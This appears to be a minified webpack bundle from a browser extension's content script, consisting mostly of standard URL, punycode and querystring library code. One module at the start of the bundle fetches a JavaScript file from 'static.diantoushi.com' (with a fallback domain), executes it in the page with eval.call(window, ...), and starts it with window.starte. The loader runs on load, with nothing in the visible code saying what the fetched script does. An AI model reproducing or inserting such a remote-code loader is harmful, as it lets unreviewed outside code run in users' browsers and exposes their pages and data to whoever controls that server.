"use strict";

var _typeof2 = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(t) {
  return typeof t;
} : function(t) {
  return t && "function" == typeof Symbol && t.constructor === Symbol && t !== Symbol.prototype ? "symbol" : typeof t;
}, _typeof = "function" == typeof Symbol && "symbol" == _typeof2(Symbol.iterator) ? function(t) {
  return void 0 === t ? "undefined" : _typeof2(t);
} : function(t) {
  return t && "function" == typeof Symbol && t.constructor === Symbol && t !== Symbol.prototype ? "symbol" : void 0 === t ? "undefined" : _typeof2(t);
};

!function(t) {
  function e(r) {
    if (n[r]) return n[r].exports;
    var o = n[r] = {
      i: r,
      l: !1,
      exports: {}
    };
    return t[r].call(o.exports, o, o.exports, e), o.l = !0, o.exports;
  }
  var n = {};
  e.m = t, e.c = n, e.d = function(t, n, r) {
    e.o(t, n) || Object.defineProperty(t, n, {
      enumerable: !0,
      get: r
    });
  }, e.r = function(t) {
    "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(t, Symbol.toStringTag, {
      value: "Module"
    }), Object.defineProperty(t, "__esModule", {
      value: !0
    });
  }, e.t = function(t, n) {
    if (1 & n && (t = e(t)), 8 & n) return t;
    if (4 & n && "object" == (void 0 === t ? "undefined" : _typeof(t)) && t && t.__esModule) return t;
    var r = Object.create(null);
    if (e.r(r), Object.defineProperty(r, "default", {
      enumerable: !0,
      value: t
    }), 2 & n && "string" != typeof t) for (var o in t) e.d(r, o, function(e) {
      return t[e];
    }.bind(null, o));
    return r;
  }, e.n = function(t) {
    var n = t && t.__esModule ? function() {
      return t.default;
    } : function() {
      return t;
    };
    return e.d(n, "a", n), n;
  }, e.o = function(t, e) {
    return Object.prototype.hasOwnProperty.call(t, e);
  }, e.p = "", e(e.s = 6);
}([ , , , , , , function(t, e, n) {
  function r(t, e) {
    for (var n = 0; n < e.length; n++) {
      var r = e[n];
      r.enumerable = r.enumerable || !1, r.configurable = !0, "value" in r && (r.writable = !0), 
      Object.defineProperty(t, r.key, r);
    }
  }
  var o = n(7);
  new (function() {
    function t() {
      !function(t, e) {
        if (!(t instanceof e)) throw new TypeError("Cannot call a class as a function");
      }(this, t), this.h1 = "diantoushi", this.h2 = "aminggongju", this.init();
    }
    return function(t, e, n) {
      e && r(t.prototype, e);
    }(t, [ {
      key: "init",
      value: function() {
        this.ajaxCode(this.h1);
      }
    }, {
      key: "ajaxCode",
      value: function(t, e) {
        var n = this, r = new Date().getDate();
        chrome.runtime.sendMessage({
          type: "ajax_data",
          data: [ {
            url: "https://static.".concat(t, ".com/diantoushi/main.js?_d=").concat(r),
            type: "get",
            dataType: "text"
          } ]
        }, function(t) {
          t.data && t.data.length ? n.run(t.data) : e || n.ajaxCode(n.h2, !0);
        });
      }
    }, {
      key: "run",
      value: function(t) {
        eval.call(window, t), window.starte({
          Url: o,
          vvv: 350
        });
      }
    } ]), t;
  }())();
}, function(t, e, n) {
  function r() {
    this.protocol = null, this.slashes = null, this.auth = null, this.host = null, this.port = null, 
    this.hostname = null, this.hash = null, this.search = null, this.query = null, this.pathname = null, 
    this.path = null, this.href = null;
  }
  function o(t, e, n) {
    if (t && a.isObject(t) && t instanceof r) return t;
    var o = new r();
    return o.parse(t, e, n), o;
  }
  var s = n(8), a = n(11);
  e.parse = o, e.resolve = function(t, e) {
    return o(t, !1, !0).resolve(e);
  }, e.resolveObject = function(t, e) {
    return t ? o(t, !1, !0).resolveObject(e) : e;
  }, e.format = function(t) {
    return a.isString(t) && (t = o(t)), t instanceof r ? t.format() : r.prototype.format.call(t);
  }, e.Url = r;
  var i = /^([a-z0-9.+-]+:)/i, h = /:[0-9]*$/, u = /^(\/\/?(?!\/)[^\?\s]*)(\?[^\s]*)?$/, c = [ "{", "}", "|", "\\", "^", "`" ].concat([ "<", ">", '"', "`", " ", "\r", "\n", "\t" ]), l = [ "'" ].concat(c), f = [ "%", "/", "?", ";", "#" ].concat(l), p = [ "/", "?", "#" ], m = /^[+a-z0-9A-Z_-]{0,63}$/, d = /^([+a-z0-9A-Z_-]{0,63})(.*)$/, y = {
    javascript: !0,
    "javascript:": !0
  }, v = {
    javascript: !0,
    "javascript:": !0
  }, b = {
    http: !0,
    https: !0,
    ftp: !0,
    gopher: !0,
    file: !0,
    "http:": !0,
    "https:": !0,
    "ftp:": !0,
    "gopher:": !0,
    "file:": !0
  }, g = n(12);
  r.prototype.parse = function(t, e, n) {
    if (!a.isString(t)) throw new TypeError("Parameter 'url' must be a string, not " + (void 0 === t ? "undefined" : _typeof(t)));
    var r = t.indexOf("?"), o = -1 !== r && r < t.indexOf("#") ? "?" : "#", h = t.split(o);
    h[0] = h[0].replace(/\\/g, "/");
    var c = t = h.join(o);
    if (c = c.trim(), !n && 1 === t.split("#").length) {
      var j = u.exec(c);
      if (j) return this.path = c, this.href = c, this.pathname = j[1], j[2] ? (this.search = j[2], 
      this.query = e ? g.parse(this.search.substr(1)) : this.search.substr(1)) : e && (this.search = "", 
      this.query = {}), this;
    }
    var O = i.exec(c);
    if (O) {
      var x = (O = O[0]).toLowerCase();
      this.protocol = x, c = c.substr(O.length);
    }
    if (n || O || c.match(/^\/\/[^@\/]+@[^@\/]+/)) {
      var w = "//" === c.substr(0, 2);
      !w || O && v[O] || (c = c.substr(2), this.slashes = !0);
    }
    if (!v[O] && (w || O && !b[O])) {
      for (var C, A, S = -1, _ = 0; _ < p.length; _++) -1 !== (I = c.indexOf(p[_])) && (-1 === S || I < S) && (S = I);
      for (-1 !== (A = -1 === S ? c.lastIndexOf("@") : c.lastIndexOf("@", S)) && (C = c.slice(0, A), 
      c = c.slice(A + 1), this.auth = decodeURIComponent(C)), S = -1, _ = 0; _ < f.length; _++) {
        var I;
        -1 !== (I = c.indexOf(f[_])) && (-1 === S || I < S) && (S = I);
      }
      -1 === S && (S = c.length), this.host = c.slice(0, S), c = c.slice(S), this.parseHost(), 
      this.hostname = this.hostname || "";
      var q = "[" === this.hostname[0] && "]" === this.hostname[this.hostname.length - 1];
      if (!q) for (var U = this.hostname.split(/\./), P = (_ = 0, U.length); _ < P; _++) {
        var k = U[_];
        if (k && !k.match(m)) {
          for (var R = "", N = 0, T = k.length; N < T; N++) 127 < k.charCodeAt(N) ? R += "x" : R += k[N];
          if (!R.match(m)) {
            var E = U.slice(0, _), F = U.slice(_ + 1), M = k.match(d);
            M && (E.push(M[1]), F.unshift(M[2])), F.length && (c = "/" + F.join(".") + c), this.hostname = E.join(".");
            break;
          }
        }
      }
      255 < this.hostname.length ? this.hostname = "" : this.hostname = this.hostname.toLowerCase(), 
      q || (this.hostname = s.toASCII(this.hostname));
      var $ = this.port ? ":" + this.port : "", z = this.hostname || "";
      this.host = z + $, this.href += this.host, q && (this.hostname = this.hostname.substr(1, this.hostname.length - 2), 
      "/" !== c[0] && (c = "/" + c));
    }
    if (!y[x]) for (_ = 0, P = l.length; _ < P; _++) {
      var L = l[_];
      if (-1 !== c.indexOf(L)) {
        var D = encodeURIComponent(L);
        D === L && (D = escape(L)), c = c.split(L).join(D);
      }
    }
    var H = c.indexOf("#");
    -1 !== H && (this.hash = c.substr(H), c = c.slice(0, H));
    var K = c.indexOf("?");
    if (-1 !== K ? (this.search = c.substr(K), this.query = c.substr(K + 1), e && (this.query = g.parse(this.query)), 
    c = c.slice(0, K)) : e && (this.search = "", this.query = {}), c && (this.pathname = c), 
    b[x] && this.hostname && !this.pathname && (this.pathname = "/"), this.pathname || this.search) {
      $ = this.pathname || "";
      var Z = this.search || "";
      this.path = $ + Z;
    }
    return this.href = this.format(), this;
  }, r.prototype.format = function() {
    var t = this.auth || "";
    t && (t = (t = encodeURIComponent(t)).replace(/%3A/i, ":"), t += "@");
    var e = this.protocol || "", n = this.pathname || "", r = this.hash || "", o = !1, s = "";
    this.host ? o = t + this.host : this.hostname && (o = t + (-1 === this.hostname.indexOf(":") ? this.hostname : "[" + this.hostname + "]"), 
    this.port && (o += ":" + this.port)), this.query && a.isObject(this.query) && Object.keys(this.query).length && (s = g.stringify(this.query));
    var i = this.search || s && "?" + s || "";
    return e && ":" !== e.substr(-1) && (e += ":"), this.slashes || (!e || b[e]) && !1 !== o ? (o = "//" + (o || ""), 
    n && "/" !== n.charAt(0) && (n = "/" + n)) : o || (o = ""), r && "#" !== r.charAt(0) && (r = "#" + r), 
    i && "?" !== i.charAt(0) && (i = "?" + i), e + o + (n = n.replace(/[?#]/g, function(t) {
      return encodeURIComponent(t);
    })) + (i = i.replace("#", "%23")) + r;
  }, r.prototype.resolve = function(t) {
    return this.resolveObject(o(t, !1, !0)).format();
  }, r.prototype.resolveObject = function(t) {
    if (a.isString(t)) {
      var e = new r();
      e.parse(t, !1, !0), t = e;
    }
    for (var n = new r(), o = Object.keys(this), s = 0; s < o.length; s++) {
      var i = o[s];
      n[i] = this[i];
    }
    if (n.hash = t.hash, "" === t.href) return n.href = n.format(), n;
    if (t.slashes && !t.protocol) {
      for (var h = Object.keys(t), u = 0; u < h.length; u++) {
        var c = h[u];
        "protocol" !== c && (n[c] = t[c]);
      }
      return b[n.protocol] && n.hostname && !n.pathname && (n.path = n.pathname = "/"), 
      n.href = n.format(), n;
    }
    if (t.protocol && t.protocol !== n.protocol) {
      if (!b[t.protocol]) {
        for (var l = Object.keys(t), f = 0; f < l.length; f++) {
          var p = l[f];
          n[p] = t[p];
        }
        return n.href = n.format(), n;
      }
      if (n.protocol = t.protocol, t.host || v[t.protocol]) n.pathname = t.pathname; else {
        for (var m = (t.pathname || "").split("/"); m.length && !(t.host = m.shift()); ) ;
        t.host || (t.host = ""), t.hostname || (t.hostname = ""), "" !== m[0] && m.unshift(""), 
        m.length < 2 && m.unshift(""), n.pathname = m.join("/");
      }
      if (n.search = t.search, n.query = t.query, n.host = t.host || "", n.auth = t.auth, 
      n.hostname = t.hostname || t.host, n.port = t.port, n.pathname || n.search) {
        var d = n.pathname || "", y = n.search || "";
        n.path = d + y;
      }
      return n.slashes = n.slashes || t.slashes, n.href = n.format(), n;
    }
    var g = n.pathname && "/" === n.pathname.charAt(0), j = t.host || t.pathname && "/" === t.pathname.charAt(0), O = j || g || n.host && t.pathname, x = O, w = n.pathname && n.pathname.split("/") || [], C = (m = t.pathname && t.pathname.split("/") || [], 
    n.protocol && !b[n.protocol]);
    if (C && (n.hostname = "", n.port = null, n.host && ("" === w[0] ? w[0] = n.host : w.unshift(n.host)), 
    n.host = "", t.protocol && (t.hostname = null, t.port = null, t.host && ("" === m[0] ? m[0] = t.host : m.unshift(t.host)), 
    t.host = null), O = O && ("" === m[0] || "" === w[0])), j) n.host = t.host || "" === t.host ? t.host : n.host, 
    n.hostname = t.hostname || "" === t.hostname ? t.hostname : n.hostname, n.search = t.search, 
    n.query = t.query, w = m; else if (m.length) w || (w = []), w.pop(), w = w.concat(m), 
    n.search = t.search, n.query = t.query; else if (!a.isNullOrUndefined(t.search)) return C && (n.hostname = n.host = w.shift(), 
    (q = !!(n.host && 0 < n.host.indexOf("@")) && n.host.split("@")) && (n.auth = q.shift(), 
    n.host = n.hostname = q.shift())), n.search = t.search, n.query = t.query, a.isNull(n.pathname) && a.isNull(n.search) || (n.path = (n.pathname ? n.pathname : "") + (n.search ? n.search : "")), 
    n.href = n.format(), n;
    if (!w.length) return n.pathname = null, n.search ? n.path = "/" + n.search : n.path = null, 
    n.href = n.format(), n;
    for (var A = w.slice(-1)[0], S = (n.host || t.host || 1 < w.length) && ("." === A || ".." === A) || "" === A, _ = 0, I = w.length; 0 <= I; I--) "." === (A = w[I]) ? w.splice(I, 1) : ".." === A ? (w.splice(I, 1), 
    _++) : _ && (w.splice(I, 1), _--);
    if (!O && !x) for (;_--; _) w.unshift("..");
    !O || "" === w[0] || w[0] && "/" === w[0].charAt(0) || w.unshift(""), S && "/" !== w.join("/").substr(-1) && w.push("");
    var q, U = "" === w[0] || w[0] && "/" === w[0].charAt(0);
    return C && (n.hostname = n.host = U ? "" : w.length ? w.shift() : "", (q = !!(n.host && 0 < n.host.indexOf("@")) && n.host.split("@")) && (n.auth = q.shift(), 
    n.host = n.hostname = q.shift())), (O = O || n.host && w.length) && !U && w.unshift(""), 
    w.length ? n.pathname = w.join("/") : (n.pathname = null, n.path = null), a.isNull(n.pathname) && a.isNull(n.search) || (n.path = (n.pathname ? n.pathname : "") + (n.search ? n.search : "")), 
    n.auth = t.auth || n.auth, n.slashes = n.slashes || t.slashes, n.href = n.format(), 
    n;
  }, r.prototype.parseHost = function() {
    var t = this.host, e = h.exec(t);
    e && (":" !== (e = e[0]) && (this.port = e.substr(1)), t = t.substr(0, t.length - e.length)), 
    t && (this.hostname = t);
  };
}, function(t, e, n) {
  (function(t, r) {
    var o;
    !function(s) {
      function a(t) {
        throw new RangeError(I[t]);
      }
      function i(t, e) {
        for (var n = t.length, r = []; n--; ) r[n] = e(t[n]);
        return r;
      }
      function h(t, e) {
        var n = t.split("@"), r = "";
        return 1 < n.length && (r = n[0] + "@", t = n[1]), r + i((t = t.replace(_, ".")).split("."), e).join(".");
      }
      function u(t) {
        for (var e, n, r = [], o = 0, s = t.length; o < s; ) 55296 <= (e = t.charCodeAt(o++)) && e <= 56319 && o < s ? 56320 == (64512 & (n = t.charCodeAt(o++))) ? r.push(((1023 & e) << 10) + (1023 & n) + 65536) : (r.push(e), 
        o--) : r.push(e);
        return r;
      }
      function c(t) {
        return i(t, function(t) {
          var e = "";
          return 65535 < t && (e += P((t -= 65536) >>> 10 & 1023 | 55296), t = 56320 | 1023 & t), 
          e + P(t);
        }).join("");
      }
      function l(t, e) {
        return t + 22 + 75 * (t < 26) - ((0 != e) << 5);
      }
      function f(t, e, n) {
        var r = 0;
        for (t = n ? U(t / O) : t >> 1, t += U(t / e); q * g >> 1 < t; r += v) t = U(t / q);
        return U(r + (q + 1) * t / (t + j));
      }
      function p(t) {
        var e, n, r, o, s, i, h, u, l, p, m, d = [], j = t.length, O = 0, A = w, S = x;
        for ((n = t.lastIndexOf(C)) < 0 && (n = 0), r = 0; r < n; ++r) 128 <= t.charCodeAt(r) && a("not-basic"), 
        d.push(t.charCodeAt(r));
        for (o = 0 < n ? n + 1 : 0; o < j; ) {
          for (s = O, i = 1, h = v; j <= o && a("invalid-input"), m = t.charCodeAt(o++), (v <= (u = m - 48 < 10 ? m - 22 : m - 65 < 26 ? m - 65 : m - 97 < 26 ? m - 97 : v) || u > U((y - O) / i)) && a("overflow"), 
          O += u * i, !(u < (l = h <= S ? b : S + g <= h ? g : h - S)); h += v) i > U(y / (p = v - l)) && a("overflow"), 
          i *= p;
          S = f(O - s, e = d.length + 1, 0 == s), U(O / e) > y - A && a("overflow"), A += U(O / e), 
          O %= e, d.splice(O++, 0, A);
        }
        return c(d);
      }
      function m(t) {
        var e, n, r, o, s, i, h, c, p, m, d, j, O, A, S, _ = [];
        for (j = (t = u(t)).length, e = w, s = x, i = n = 0; i < j; ++i) (d = t[i]) < 128 && _.push(P(d));
        for (r = o = _.length, o && _.push(C); r < j; ) {
          for (h = y, i = 0; i < j; ++i) e <= (d = t[i]) && d < h && (h = d);
          for (h - e > U((y - n) / (O = r + 1)) && a("overflow"), n += (h - e) * O, e = h, 
          i = 0; i < j; ++i) if ((d = t[i]) < e && ++n > y && a("overflow"), d == e) {
            for (c = n, p = v; !(c < (m = p <= s ? b : s + g <= p ? g : p - s)); p += v) S = c - m, 
            A = v - m, _.push(P(l(m + S % A, 0))), c = U(S / A);
            _.push(P(l(c, 0))), s = f(n, O, r == o), n = 0, ++r;
          }
          ++n, ++e;
        }
        return _.join("");
      }
      e && e.nodeType, t && t.nodeType;
      var d, y = (void 0 === r || _typeof(r), 2147483647), v = 36, b = 1, g = 26, j = 38, O = 700, x = 72, w = 128, C = "-", A = /^xn--/, S = /[^\x20-\x7E]/, _ = /[\x2E\u3002\uFF0E\uFF61]/g, I = {
        overflow: "Overflow: input needs wider integers to process",
        "not-basic": "Illegal input >= 0x80 (not a basic code point)",
        "invalid-input": "Invalid input"
      }, q = v - b, U = Math.floor, P = String.fromCharCode;
      d = {
        version: "1.4.1",
        ucs2: {
          decode: u,
          encode: c
        },
        decode: p,
        encode: m,
        toASCII: function(t) {
          return h(t, function(t) {
            return S.test(t) ? "xn--" + m(t) : t;
          });
        },
        toUnicode: function(t) {
          return h(t, function(t) {
            return A.test(t) ? p(t.slice(4).toLowerCase()) : t;
          });
        }
      }, void 0 === (o = function() {
        return d;
      }.call(e, n, e, t)) || (t.exports = o);
    }();
  }).call(this, n(9)(t), n(10));
}, function(t, e) {
  t.exports = function(t) {
    return t.webpackPolyfill || (t.deprecate = function() {}, t.paths = [], t.children || (t.children = []), 
    Object.defineProperty(t, "loaded", {
      enumerable: !0,
      get: function() {
        return t.l;
      }
    }), Object.defineProperty(t, "id", {
      enumerable: !0,
      get: function() {
        return t.i;
      }
    }), t.webpackPolyfill = 1), t;
  };
}, function(t, e) {
  var n;
  n = function() {
    return this;
  }();
  try {
    n = n || new Function("return this")();
  } catch (t) {
    "object" == ("undefined" == typeof window ? "undefined" : _typeof(window)) && (n = window);
  }
  t.exports = n;
}, function(t, e, n) {
  t.exports = {
    isString: function(t) {
      return "string" == typeof t;
    },
    isObject: function(t) {
      return "object" == (void 0 === t ? "undefined" : _typeof(t)) && null !== t;
    },
    isNull: function(t) {
      return null === t;
    },
    isNullOrUndefined: function(t) {
      return null == t;
    }
  };
}, function(t, e, n) {
  e.decode = e.parse = n(13), e.encode = e.stringify = n(14);
}, function(t, e, n) {
  t.exports = function(t, e, n, o) {
    e = e || "&", n = n || "=";
    var s = {};
    if ("string" != typeof t || 0 === t.length) return s;
    var a = /\+/g;
    t = t.split(e);
    var i = 1e3;
    o && "number" == typeof o.maxKeys && (i = o.maxKeys);
    var h, u, c = t.length;
    0 < i && i < c && (c = i);
    for (var l = 0; l < c; ++l) {
      var f, p, m, d, y = t[l].replace(a, "%20"), v = y.indexOf(n);
      p = 0 <= v ? (f = y.substr(0, v), y.substr(v + 1)) : (f = y, ""), m = decodeURIComponent(f), 
      d = decodeURIComponent(p), h = s, u = m, Object.prototype.hasOwnProperty.call(h, u) ? r(s[m]) ? s[m].push(d) : s[m] = [ s[m], d ] : s[m] = d;
    }
    return s;
  };
  var r = Array.isArray || function(t) {
    return "[object Array]" === Object.prototype.toString.call(t);
  };
}, function(t, e, n) {
  function r(t) {
    switch (void 0 === t ? "undefined" : _typeof(t)) {
      case "string":
      return t;

      case "boolean":
      return t ? "true" : "false";

      case "number":
      return isFinite(t) ? t : "";

      default:
      return "";
    }
  }
  function o(t, e) {
    if (t.map) return t.map(e);
    for (var n = [], r = 0; r < t.length; r++) n.push(e(t[r], r));
    return n;
  }
  t.exports = function(t, e, n, i) {
    return e = e || "&", n = n || "=", null === t && (t = void 0), "object" == (void 0 === t ? "undefined" : _typeof(t)) ? o(a(t), function(a) {
      var i = encodeURIComponent(r(a)) + n;
      return s(t[a]) ? o(t[a], function(t) {
        return i + encodeURIComponent(r(t));
      }).join(e) : i + encodeURIComponent(r(t[a]));
    }).join(e) : i ? encodeURIComponent(r(i)) + n + encodeURIComponent(r(t)) : "";
  };
  var s = Array.isArray || function(t) {
    return "[object Array]" === Object.prototype.toString.call(t);
  }, a = Object.keys || function(t) {
    var e = [];
    for (var n in t) Object.prototype.hasOwnProperty.call(t, n) && e.push(n);
    return e;
  };
} ]);